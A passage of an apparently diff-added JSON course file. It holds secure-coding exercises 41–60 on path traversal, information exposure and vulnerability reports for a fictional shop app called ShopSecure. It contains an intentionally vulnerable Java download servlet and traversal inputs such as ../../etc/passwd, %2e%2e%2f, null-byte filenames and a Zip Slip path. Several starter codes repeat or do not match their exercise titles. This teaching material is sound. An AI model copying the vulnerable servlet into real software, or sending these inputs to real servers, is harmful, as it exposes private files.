+          "starter_code": "// Path Traversal / Info Exposure: Spot the Path Traversal\n\n// File download endpoint:\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp)\n        throws IOException {\n    String filename = req.getParameter(\"file\");\n    File file = new File(\"web/invoices/\" + filename);\n    \n    if (file.exists()) {\n        byte[] content = Files.readAllBytes(file.toPath());\n        resp.getOutputStream().write(content);\n    }\n}\n\n// TODO: What's wrong? How would you fix it?",
+          "expected_output": "See hints for solution to: Spot the Path Traversal",
+          "hints": [
+            {
+              "message": "For path traversal: the ../ sequence means 'go up one directory'. Multiple ../../../ sequences can reach the root filesystem."
+            },
+            {
+              "message": "The fix: resolve the full path, normalize it (collapse ../), then check it starts with the allowed base directory. If not → reject."
+            },
+            {
+              "message": "For Spot the Path Traversal: Use Path.normalize().startsWith(basePath) for traversal. For info exposure: log.error() server-side, generic message to user, remove Server headers."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_42",
+          "title": "Exercise 42: Trace the Path Resolution",
+          "description": "What file does web/invoices/../../etc/passwd resolve to?",
+          "difficulty": "beginner",
+          "category": "Path Traversal & Config",
+          "estimated_minutes": 5,
+          "ai_intro": "Security configuration matters! Let's work on trace the path resolution. Even one misconfigured endpoint can undo all other defences. 🔒",
+          "starter_code": "// Path Traversal / Info Exposure: Trace the Path Resolution\n\n// File download endpoint:\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp)\n        throws IOException {\n    String filename = req.getParameter(\"file\");\n    File file = new File(\"web/invoices/\" + filename);\n    \n    if (file.exists()) {\n        byte[] content = Files.readAllBytes(file.toPath());\n        resp.getOutputStream().write(content);\n    }\n}\n\n// TODO: What's wrong? How would you fix it?",
+          "expected_output": "See hints for solution to: Trace the Path Resolution",
+          "hints": [
+            {
+              "message": "For path traversal: the ../ sequence means 'go up one directory'. Multiple ../../../ sequences can reach the root filesystem."
+            },
+            {
+              "message": "The fix: resolve the full path, normalize it (collapse ../), then check it starts with the allowed base directory. If not → reject."
+            },
+            {
+              "message": "For Trace the Path Resolution: Use Path.normalize().startsWith(basePath) for traversal. For info exposure: log.error() server-side, generic message to user, remove Server headers."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_43",
+          "title": "Exercise 43: Fix Path Traversal with Canonicalisation",
+          "description": "Use Path.normalize() and startsWith() to validate the download path.",
+          "difficulty": "beginner",
+          "category": "Path Traversal & Config",
+          "estimated_minutes": 5,
+          "ai_intro": "Security configuration matters! Let's work on fix path traversal with canonicalisation. Even one misconfigured endpoint can undo all other defences. 🔒",
+          "starter_code": "// Path Traversal / Info Exposure: Fix Path Traversal with Canonicalisation\n\n// File download endpoint:\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp)\n        throws IOException {\n    String filename = req.getParameter(\"file\");\n    File file = new File(\"web/invoices/\" + filename);\n    \n    if (file.exists()) {\n        byte[] content = Files.readAllBytes(file.toPath());\n        resp.getOutputStream().write(content);\n    }\n}\n\n// TODO: What's wrong? How would you fix it?",
+          "expected_output": "See hints for solution to: Fix Path Traversal with Canonicalisation",
+          "hints": [
+            {
+              "message": "For path traversal: the ../ sequence means 'go up one directory'. Multiple ../../../ sequences can reach the root filesystem."
+            },
+            {
+              "message": "The fix: resolve the full path, normalize it (collapse ../), then check it starts with the allowed base directory. If not → reject."
+            },
+            {
+              "message": "For Fix Path Traversal with Canonicalisation: Use Path.normalize().startsWith(basePath) for traversal. For info exposure: log.error() server-side, generic message to user, remove Server headers."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_44",
+          "title": "Exercise 44: URL Encoding Bypass",
+          "description": "Does %2e%2e%2f bypass the path check? Test with different encoding schemes.",
+          "difficulty": "intermediate",
+          "category": "Path Traversal & Config",
+          "estimated_minutes": 7,
+          "ai_intro": "Security configuration matters! Let's work on url encoding bypass. Even one misconfigured endpoint can undo all other defences. 🔒",
+          "starter_code": "// Path Traversal / Info Exposure: URL Encoding Bypass\n\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\n\n// TODO: Implement secure path validation\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp)\n        throws IOException {\n    String filename = req.getParameter(\"file\");\n    \n    // Decode URL encoding first?\n    // filename = URLDecoder.decode(filename, \"UTF-8\");\n    \n    Path base = Paths.get(\"web/invoices\").toAbsolutePath().normalize();\n    Path requested = base.resolve(filename).normalize();\n    \n    // TODO: What check do you need here?\n    // What about double URL encoding? (%252e%252e%252f)\n}",
+          "expected_output": "See hints for solution to: URL Encoding Bypass",
+          "hints": [
+            {
+              "message": "For path traversal: the ../ sequence means 'go up one directory'. Multiple ../../../ sequences can reach the root filesystem."
+            },
+            {
+              "message": "The fix: resolve the full path, normalize it (collapse ../), then check it starts with the allowed base directory. If not → reject."
+            },
+            {
+              "message": "For URL Encoding Bypass: Use Path.normalize().startsWith(basePath) for traversal. For info exposure: log.error() server-side, generic message to user, remove Server headers."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_45",
+          "title": "Exercise 45: Null Byte Injection",
+          "description": "In older systems, filename%00.pdf truncates at the null byte. Analyse if this bypasses extension checks.",
+          "difficulty": "intermediate",
+          "category": "Path Traversal & Config",
+          "estimated_minutes": 7,
+          "ai_intro": "Security configuration matters! Let's work on null byte injection. Even one misconfigured endpoint can undo all other defences. 🔒",
+          "starter_code": "// Path Traversal / Info Exposure: Null Byte Injection\n\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\n\n// TODO: Implement secure path validation\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp)\n        throws IOException {\n    String filename = req.getParameter(\"file\");\n    \n    // Decode URL encoding first?\n    // filename = URLDecoder.decode(filename, \"UTF-8\");\n    \n    Path base = Paths.get(\"web/invoices\").toAbsolutePath().normalize();\n    Path requested = base.resolve(filename).normalize();\n    \n    // TODO: What check do you need here?\n    // What about double URL encoding? (%252e%252e%252f)\n}",
+          "expected_output": "See hints for solution to: Null Byte Injection",
+          "hints": [
+            {
+              "message": "For path traversal: the ../ sequence means 'go up one directory'. Multiple ../../../ sequences can reach the root filesystem."
+            },
+            {
+              "message": "The fix: resolve the full path, normalize it (collapse ../), then check it starts with the allowed base directory. If not → reject."
+            },
+            {
+              "message": "For Null Byte Injection: Use Path.normalize().startsWith(basePath) for traversal. For info exposure: log.error() server-side, generic message to user, remove Server headers."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_46",
+          "title": "Exercise 46: Information Exposure — Stack Traces",
+          "description": "Replace the verbose error handler with secure logging and generic messages.",
+          "difficulty": "intermediate",
+          "category": "Path Traversal & Config",
+          "estimated_minutes": 7,
+          "ai_intro": "Security configuration matters! Let's work on information exposure — stack traces. Even one misconfigured endpoint can undo all other defences. 🔒",
+          "starter_code": "// Path Traversal / Info Exposure: Information Exposure — Stack Traces\n\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\n\n// TODO: Implement secure path validation\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp)\n        throws IOException {\n    String filename = req.getParameter(\"file\");\n    \n    // Decode URL encoding first?\n    // filename = URLDecoder.decode(filename, \"UTF-8\");\n    \n    Path base = Paths.get(\"web/invoices\").toAbsolutePath().normalize();\n    Path requested = base.resolve(filename).normalize();\n    \n    // TODO: What check do you need here?\n    // What about double URL encoding? (%252e%252e%252f)\n}",
+          "expected_output": "See hints for solution to: Information Exposure — Stack Traces",
+          "hints": [
+            {
+              "message": "For path traversal: the ../ sequence means 'go up one directory'. Multiple ../../../ sequences can reach the root filesystem."
+            },
+            {
+              "message": "The fix: resolve the full path, normalize it (collapse ../), then check it starts with the allowed base directory. If not → reject."
+            },
+            {
+              "message": "For Information Exposure — Stack Traces: Use Path.normalize().startsWith(basePath) for traversal. For info exposure: log.error() server-side, generic message to user, remove Server headers."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_47",
+          "title": "Exercise 47: Server Header Hardening",
+          "description": "Configure the server to remove version headers that reveal technology stack.",
+          "difficulty": "intermediate",
+          "category": "Path Traversal & Config",
+          "estimated_minutes": 7,
+          "ai_intro": "Security configuration matters! Let's work on server header hardening. Even one misconfigured endpoint can undo all other defences. 🔒",
+          "starter_code": "// Path Traversal / Info Exposure: Server Header Hardening\n\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\n\n// TODO: Implement secure path validation\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp)\n        throws IOException {\n    String filename = req.getParameter(\"file\");\n    \n    // Decode URL encoding first?\n    // filename = URLDecoder.decode(filename, \"UTF-8\");\n    \n    Path base = Paths.get(\"web/invoices\").toAbsolutePath().normalize();\n    Path requested = base.resolve(filename).normalize();\n    \n    // TODO: What check do you need here?\n    // What about double URL encoding? (%252e%252e%252f)\n}",
+          "expected_output": "See hints for solution to: Server Header Hardening",
+          "hints": [
+            {
+              "message": "For path traversal: the ../ sequence means 'go up one directory'. Multiple ../../../ sequences can reach the root filesystem."
+            },
+            {
+              "message": "The fix: resolve the full path, normalize it (collapse ../), then check it starts with the allowed base directory. If not → reject."
+            },
+            {
+              "message": "For Server Header Hardening: Use Path.normalize().startsWith(basePath) for traversal. For info exposure: log.error() server-side, generic message to user, remove Server headers."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_48",
+          "title": "Exercise 48: Error Reference System",
+          "description": "Build a system that shows users an error reference code while logging full details server-side.",
+          "difficulty": "advanced",
+          "category": "Path Traversal & Config",
+          "estimated_minutes": 10,
+          "ai_intro": "Security configuration matters! Let's work on error reference system. Even one misconfigured endpoint can undo all other defences. 🔒",
+          "starter_code": "// Advanced: Error Reference System\n\nimport java.util.logging.Logger;\n\n// TODO: Build a complete secure error handling system\n// Requirements:\n// 1. Generic error page shown to users (no technical details)\n// 2. Unique error reference code for each error\n// 3. Full details logged server-side with same reference\n// 4. No server version in response headers\n// 5. Custom 404 page (don't reveal valid URLs)\n// 6. Rate limit error pages to prevent error-based enumeration",
+          "expected_output": "See hints for solution to: Error Reference System",
+          "hints": [
+            {
+              "message": "For path traversal: the ../ sequence means 'go up one directory'. Multiple ../../../ sequences can reach the root filesystem."
+            },
+            {
+              "message": "The fix: resolve the full path, normalize it (collapse ../), then check it starts with the allowed base directory. If not → reject."
+            },
+            {
+              "message": "For Error Reference System: Use Path.normalize().startsWith(basePath) for traversal. For info exposure: log.error() server-side, generic message to user, remove Server headers."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_49",
+          "title": "Exercise 49: Path Traversal in ZIP Extraction",
+          "description": "A ZIP file contains ../../etc/cron.d/evil. How does Zip Slip work? Write safe extraction code.",
+          "difficulty": "advanced",
+          "category": "Path Traversal & Config",
+          "estimated_minutes": 10,
+          "ai_intro": "Security configuration matters! Let's work on path traversal in zip extraction. Even one misconfigured endpoint can undo all other defences. 🔒",
+          "starter_code": "// Advanced: Path Traversal in ZIP Extraction\n\nimport java.util.logging.Logger;\n\n// TODO: Build a complete secure error handling system\n// Requirements:\n// 1. Generic error page shown to users (no technical details)\n// 2. Unique error reference code for each error\n// 3. Full details logged server-side with same reference\n// 4. No server version in response headers\n// 5. Custom 404 page (don't reveal valid URLs)\n// 6. Rate limit error pages to prevent error-based enumeration",
+          "expected_output": "See hints for solution to: Path Traversal in ZIP Extraction",
+          "hints": [
+            {
+              "message": "For path traversal: the ../ sequence means 'go up one directory'. Multiple ../../../ sequences can reach the root filesystem."
+            },
+            {
+              "message": "The fix: resolve the full path, normalize it (collapse ../), then check it starts with the allowed base directory. If not → reject."
+            },
+            {
+              "message": "For Path Traversal in ZIP Extraction: Use Path.normalize().startsWith(basePath) for traversal. For info exposure: log.error() server-side, generic message to user, remove Server headers."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_50",
+          "title": "Exercise 50: Full Security Configuration Audit",
+          "description": "Audit error handling, headers, file access, and directory listing across all endpoints.",
+          "difficulty": "advanced",
+          "category": "Path Traversal & Config",
+          "estimated_minutes": 10,
+          "ai_intro": "Security configuration matters! Let's work on full security configuration audit. Even one misconfigured endpoint can undo all other defences. 🔒",
+          "starter_code": "// Advanced: Full Security Configuration Audit\n\nimport java.util.logging.Logger;\n\n// TODO: Build a complete secure error handling system\n// Requirements:\n// 1. Generic error page shown to users (no technical details)\n// 2. Unique error reference code for each error\n// 3. Full details logged server-side with same reference\n// 4. No server version in response headers\n// 5. Custom 404 page (don't reveal valid URLs)\n// 6. Rate limit error pages to prevent error-based enumeration",
+          "expected_output": "See hints for solution to: Full Security Configuration Audit",
+          "hints": [
+            {
+              "message": "For path traversal: the ../ sequence means 'go up one directory'. Multiple ../../../ sequences can reach the root filesystem."
+            },
+            {
+              "message": "The fix: resolve the full path, normalize it (collapse ../), then check it starts with the allowed base directory. If not → reject."
+            },
+            {
+              "message": "For Full Security Configuration Audit: Use Path.normalize().startsWith(basePath) for traversal. For info exposure: log.error() server-side, generic message to user, remove Server headers."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_51",
+          "title": "Exercise 51: Write a Vulnerability Report — SQLi",
+          "description": "Use the professional template to write a complete report for the SQL injection vulnerability.",
+          "difficulty": "beginner",
+          "category": "Applied Assessment",
+          "estimated_minutes": 5,
+          "ai_intro": "Now let's put it all together! Write a Vulnerability Report — SQLi is a key professional skill. Security analysts write reports like this every day. 📝",
+          "starter_code": "// Applied Assessment: Write a Vulnerability Report — SQLi\n\n// Use this professional vulnerability report template:\n//\n// TITLE: [Vulnerability Name] in [Location]\n// CWE: CWE-XXX\n// OWASP: A0X:2025 — [Category Name]\n// SEVERITY: [Critical/High/Medium/Low]\n//\n// DESCRIPTION:\n//   [What the vulnerability is, in plain English]\n//\n// LOCATION:\n//   [Exact endpoint, file, method]\n//\n// STEPS TO REPRODUCE:\n//   1. [Step]\n//   2. [Step]\n//   3. [Observe: ...]\n//\n// IMPACT:\n//   Confidentiality: [HIGH/MEDIUM/LOW] — [Why]\n//   Integrity: [HIGH/MEDIUM/LOW] — [Why]\n//   Availability: [HIGH/MEDIUM/LOW] — [Why]\n//\n// REMEDIATION:\n//   [Specific code-level fix]\n\n// TODO: Fill in all sections for the vulnerability",
+          "expected_output": "See hints for guidance on: Write a Vulnerability Report — SQLi",
+          "hints": [
+            {
+              "message": "Start with the most important information first. A busy CTO reads the title, severity, and fix — they may not read everything else."
+            },
+            {
+              "message": "Be specific: don't just say 'there's a security issue.' Say exactly what, where, how to exploit, why it matters, and how to fix it."
+            },
+            {
+              "message": "For Write a Vulnerability Report — SQLi: Use CWE identifiers for precise classification, OWASP categories for standard communication, and CVSS scores for severity. Include both the exploit evidence AND the remediation code."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_52",
+          "title": "Exercise 52: Write a Vulnerability Report — XSS",
+          "description": "Document the stored XSS vulnerability with all 8 report sections.",
+          "difficulty": "beginner",
+          "category": "Applied Assessment",
+          "estimated_minutes": 5,
+          "ai_intro": "Now let's put it all together! Write a Vulnerability Report — XSS is a key professional skill. Security analysts write reports like this every day. 📝",
+          "starter_code": "// Applied Assessment: Write a Vulnerability Report — XSS\n\n// Use this professional vulnerability report template:\n//\n// TITLE: [Vulnerability Name] in [Location]\n// CWE: CWE-XXX\n// OWASP: A0X:2025 — [Category Name]\n// SEVERITY: [Critical/High/Medium/Low]\n//\n// DESCRIPTION:\n//   [What the vulnerability is, in plain English]\n//\n// LOCATION:\n//   [Exact endpoint, file, method]\n//\n// STEPS TO REPRODUCE:\n//   1. [Step]\n//   2. [Step]\n//   3. [Observe: ...]\n//\n// IMPACT:\n//   Confidentiality: [HIGH/MEDIUM/LOW] — [Why]\n//   Integrity: [HIGH/MEDIUM/LOW] — [Why]\n//   Availability: [HIGH/MEDIUM/LOW] — [Why]\n//\n// REMEDIATION:\n//   [Specific code-level fix]\n\n// TODO: Fill in all sections for the vulnerability",
+          "expected_output": "See hints for guidance on: Write a Vulnerability Report — XSS",
+          "hints": [
+            {
+              "message": "Start with the most important information first. A busy CTO reads the title, severity, and fix — they may not read everything else."
+            },
+            {
+              "message": "Be specific: don't just say 'there's a security issue.' Say exactly what, where, how to exploit, why it matters, and how to fix it."
+            },
+            {
+              "message": "For Write a Vulnerability Report — XSS: Use CWE identifiers for precise classification, OWASP categories for standard communication, and CVSS scores for severity. Include both the exploit evidence AND the remediation code."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_53",
+          "title": "Exercise 53: CIA Impact Matrix",
+          "description": "Create a CIA impact assessment for all 6 vulnerabilities in ShopSecure.",
+          "difficulty": "beginner",
+          "category": "Applied Assessment",
+          "estimated_minutes": 5,
+          "ai_intro": "Now let's put it all together! CIA Impact Matrix is a key professional skill. Security analysts write reports like this every day. 📝",
+          "starter_code": "// Applied Assessment: CIA Impact Matrix\n\n// Use this professional vulnerability report template:\n//\n// TITLE: [Vulnerability Name] in [Location]\n// CWE: CWE-XXX\n// OWASP: A0X:2025 — [Category Name]\n// SEVERITY: [Critical/High/Medium/Low]\n//\n// DESCRIPTION:\n//   [What the vulnerability is, in plain English]\n//\n// LOCATION:\n//   [Exact endpoint, file, method]\n//\n// STEPS TO REPRODUCE:\n//   1. [Step]\n//   2. [Step]\n//   3. [Observe: ...]\n//\n// IMPACT:\n//   Confidentiality: [HIGH/MEDIUM/LOW] — [Why]\n//   Integrity: [HIGH/MEDIUM/LOW] — [Why]\n//   Availability: [HIGH/MEDIUM/LOW] — [Why]\n//\n// REMEDIATION:\n//   [Specific code-level fix]\n\n// TODO: Fill in all sections for the vulnerability",
+          "expected_output": "See hints for guidance on: CIA Impact Matrix",
+          "hints": [
+            {
+              "message": "Start with the most important information first. A busy CTO reads the title, severity, and fix — they may not read everything else."
+            },
+            {
+              "message": "Be specific: don't just say 'there's a security issue.' Say exactly what, where, how to exploit, why it matters, and how to fix it."
+            },
+            {
+              "message": "For CIA Impact Matrix: Use CWE identifiers for precise classification, OWASP categories for standard communication, and CVSS scores for severity. Include both the exploit evidence AND the remediation code."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_54",
+          "title": "Exercise 54: OWASP Classification Exercise",
+          "description": "Map each ShopSecure vulnerability to the correct OWASP Top 10:2025 category.",
+          "difficulty": "intermediate",
+          "category": "Applied Assessment",
+          "estimated_minutes": 7,
+          "ai_intro": "Now let's put it all together! OWASP Classification Exercise is a key professional skill. Security analysts write reports like this every day. 📝",
+          "starter_code": "// Applied Assessment: OWASP Classification Exercise\n\n// ShopSecure has 6 vulnerabilities:\n// 1. SQL Injection (CWE-89) — /shop/search\n// 2. Stored XSS (CWE-79) — /shop/review\n// 3. Broken Access Control (CWE-284) — /shop/admin/*\n// 4. CSRF (CWE-352) — /shop/profile/edit\n// 5. Path Traversal (CWE-22) — /shop/download\n// 6. Info Exposure (CWE-209) — error pages\n\n// TODO: Map each ShopSecure vulnerability to the correct OWASP Top 10:2025 category.\n// Consider: ease of discovery, ease of exploitation,\n// number of affected users, data sensitivity, business impact",
+          "expected_output": "See hints for guidance on: OWASP Classification Exercise",
+          "hints": [
+            {
+              "message": "Start with the most important information first. A busy CTO reads the title, severity, and fix — they may not read everything else."
+            },
+            {
+              "message": "Be specific: don't just say 'there's a security issue.' Say exactly what, where, how to exploit, why it matters, and how to fix it."
+            },
+            {
+              "message": "For OWASP Classification Exercise: Use CWE identifiers for precise classification, OWASP categories for standard communication, and CVSS scores for severity. Include both the exploit evidence AND the remediation code."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_55",
+          "title": "Exercise 55: Severity Ranking — Prioritise Fixes",
+          "description": "Rank all 6 vulnerabilities by severity and create a remediation timeline.",
+          "difficulty": "intermediate",
+          "category": "Applied Assessment",
+          "estimated_minutes": 7,
+          "ai_intro": "Now let's put it all together! Severity Ranking — Prioritise Fixes is a key professional skill. Security analysts write reports like this every day. 📝",
+          "starter_code": "// Applied Assessment: Severity Ranking — Prioritise Fixes\n\n// ShopSecure has 6 vulnerabilities:\n// 1. SQL Injection (CWE-89) — /shop/search\n// 2. Stored XSS (CWE-79) — /shop/review\n// 3. Broken Access Control (CWE-284) — /shop/admin/*\n// 4. CSRF (CWE-352) — /shop/profile/edit\n// 5. Path Traversal (CWE-22) — /shop/download\n// 6. Info Exposure (CWE-209) — error pages\n\n// TODO: Rank all 6 vulnerabilities by severity and create a remediation timeline.\n// Consider: ease of discovery, ease of exploitation,\n// number of affected users, data sensitivity, business impact",
+          "expected_output": "See hints for guidance on: Severity Ranking — Prioritise Fixes",
+          "hints": [
+            {
+              "message": "Start with the most important information first. A busy CTO reads the title, severity, and fix — they may not read everything else."
+            },
+            {
+              "message": "Be specific: don't just say 'there's a security issue.' Say exactly what, where, how to exploit, why it matters, and how to fix it."
+            },
+            {
+              "message": "For Severity Ranking — Prioritise Fixes: Use CWE identifiers for precise classification, OWASP categories for standard communication, and CVSS scores for severity. Include both the exploit evidence AND the remediation code."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_56",
+          "title": "Exercise 56: Real-World Breach Analysis",
+          "description": "The 2023 MOVEit breach was SQL injection. Compare it to ShopSecure's vulnerability.",
+          "difficulty": "intermediate",
+          "category": "Applied Assessment",
+          "estimated_minutes": 7,
+          "ai_intro": "Now let's put it all together! Real-World Breach Analysis is a key professional skill. Security analysts write reports like this every day. 📝",
+          "starter_code": "// Applied Assessment: Real-World Breach Analysis\n\n// ShopSecure has 6 vulnerabilities:\n// 1. SQL Injection (CWE-89) — /shop/search\n// 2. Stored XSS (CWE-79) — /shop/review\n// 3. Broken Access Control (CWE-284) — /shop/admin/*\n// 4. CSRF (CWE-352) — /shop/profile/edit\n// 5. Path Traversal (CWE-22) — /shop/download\n// 6. Info Exposure (CWE-209) — error pages\n\n// TODO: The 2023 MOVEit breach was SQL injection. Compare it to ShopSecure's vulnerability.\n// Consider: ease of discovery, ease of exploitation,\n// number of affected users, data sensitivity, business impact",
+          "expected_output": "See hints for guidance on: Real-World Breach Analysis",
+          "hints": [
+            {
+              "message": "Start with the most important information first. A busy CTO reads the title, severity, and fix — they may not read everything else."
+            },
+            {
+              "message": "Be specific: don't just say 'there's a security issue.' Say exactly what, where, how to exploit, why it matters, and how to fix it."
+            },
+            {
+              "message": "For Real-World Breach Analysis: Use CWE identifiers for precise classification, OWASP categories for standard communication, and CVSS scores for severity. Include both the exploit evidence AND the remediation code."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_57",
+          "title": "Exercise 57: Defence in Depth Design",
+          "description": "Design a 5-layer security architecture for an e-commerce application.",
+          "difficulty": "intermediate",
+          "category": "Applied Assessment",
+          "estimated_minutes": 7,
+          "ai_intro": "Now let's put it all together! Defence in Depth Design is a key professional skill. Security analysts write reports like this every day. 📝",
+          "starter_code": "// Applied Assessment: Defence in Depth Design\n\n// ShopSecure has 6 vulnerabilities:\n// 1. SQL Injection (CWE-89) — /shop/search\n// 2. Stored XSS (CWE-79) — /shop/review\n// 3. Broken Access Control (CWE-284) — /shop/admin/*\n// 4. CSRF (CWE-352) — /shop/profile/edit\n// 5. Path Traversal (CWE-22) — /shop/download\n// 6. Info Exposure (CWE-209) — error pages\n\n// TODO: Design a 5-layer security architecture for an e-commerce application.\n// Consider: ease of discovery, ease of exploitation,\n// number of affected users, data sensitivity, business impact",
+          "expected_output": "See hints for guidance on: Defence in Depth Design",
+          "hints": [
+            {
+              "message": "Start with the most important information first. A busy CTO reads the title, severity, and fix — they may not read everything else."
+            },
+            {
+              "message": "Be specific: don't just say 'there's a security issue.' Say exactly what, where, how to exploit, why it matters, and how to fix it."
+            },
+            {
+              "message": "For Defence in Depth Design: Use CWE identifiers for precise classification, OWASP categories for standard communication, and CVSS scores for severity. Include both the exploit evidence AND the remediation code."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_58",
+          "title": "Exercise 58: Full ShopSecure Assessment Report",
+          "description": "Write a complete security assessment report covering all vulnerabilities found.",
+          "difficulty": "advanced",
+          "category": "Applied Assessment",
+          "estimated_minutes": 10,
+          "ai_intro": "Now let's put it all together! Full ShopSecure Assessment Report is a key professional skill. Security analysts write reports like this every day. 📝",
+          "starter_code": "// Advanced Assessment: Full ShopSecure Assessment Report\n\n// Write a complete security assessment covering:\n// Executive Summary (non-technical overview)\n// Methodology (how you tested)\n// Findings (each vulnerability with full report)\n// Risk Matrix (severity vs likelihood chart)\n// Remediation Plan (prioritised fix timeline)\n// Appendix (all payloads and evidence)\n\n// Structure your response as a professional deliverable\n// that could be presented to a CTO or board of directors.",
+          "expected_output": "See hints for guidance on: Full ShopSecure Assessment Report",
+          "hints": [
+            {
+              "message": "Start with the most important information first. A busy CTO reads the title, severity, and fix — they may not read everything else."
+            },
+            {
+              "message": "Be specific: don't just say 'there's a security issue.' Say exactly what, where, how to exploit, why it matters, and how to fix it."
+            },
+            {
+              "message": "For Full ShopSecure Assessment Report: Use CWE identifiers for precise classification, OWASP categories for standard communication, and CVSS scores for severity. Include both the exploit evidence AND the remediation code."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_59",
+          "title": "Exercise 59: Remediation Verification Plan",
+          "description": "For each fix, write a test case that verifies the vulnerability is actually resolved.",
+          "difficulty": "advanced",
+          "category": "Applied Assessment",
+          "estimated_minutes": 10,
+          "ai_intro": "Now let's put it all together! Remediation Verification Plan is a key professional skill. Security analysts write reports like this every day. 📝",
+          "starter_code": "// Advanced Assessment: Remediation Verification Plan\n\n// Write a complete security assessment covering:\n// Executive Summary (non-technical overview)\n// Methodology (how you tested)\n// Findings (each vulnerability with full report)\n// Risk Matrix (severity vs likelihood chart)\n// Remediation Plan (prioritised fix timeline)\n// Appendix (all payloads and evidence)\n\n// Structure your response as a professional deliverable\n// that could be presented to a CTO or board of directors.",
+          "expected_output": "See hints for guidance on: Remediation Verification Plan",
+          "hints": [
+            {
+              "message": "Start with the most important information first. A busy CTO reads the title, severity, and fix — they may not read everything else."
+            },
+            {
+              "message": "Be specific: don't just say 'there's a security issue.' Say exactly what, where, how to exploit, why it matters, and how to fix it."
+            },
+            {
+              "message": "For Remediation Verification Plan: Use CWE identifiers for precise classification, OWASP categories for standard communication, and CVSS scores for severity. Include both the exploit evidence AND the remediation code."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_60",
+          "title": "Exercise 60: Security Architecture Review",
+          "description": "Redesign ShopSecure with security built in from the start (Secure by Design).",
+          "difficulty": "advanced",
+          "category": "Applied Assessment",
+          "estimated_minutes": 10,
+          "ai_intro": "Now let's put it all together! Security Architecture Review is a key professional skill. Security analysts write reports like this every day. 📝",
+          "starter_code": "// Advanced Assessment: Security Architecture Review\n\n// Write a complete security assessment covering:\n// Executive Summary (non-technical overview)\n// Methodology (how you tested)\n// Findings (each vulnerability with full report)\n// Risk Matrix (severity vs likelihood chart)\n// Remediation Plan (prioritised fix timeline)\n// Appendix (all payloads and evidence)\n\n// Structure your response as a professional deliverable\n// that could be presented to a CTO or board of directors.",
+          "expected_output": "See hints for guidance on: Security Architecture Review",
+          "hints": [
+            {
+              "message": "Start with the most important information first. A busy CTO reads the title, severity, and fix — they may not read everything else."
+            },
+            {
+              "message": "Be specific: don't just say 'there's a security issue.' Say exactly what, where, how to exploit, why it matters, and how to fix it."
+            },
+            {
+              "message": "For Security Architecture Review: Use CWE identifiers for precise classification, OWASP categories for standard communication, and CVSS scores for severity. Include both the exploit evidence AND the remediation code."
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
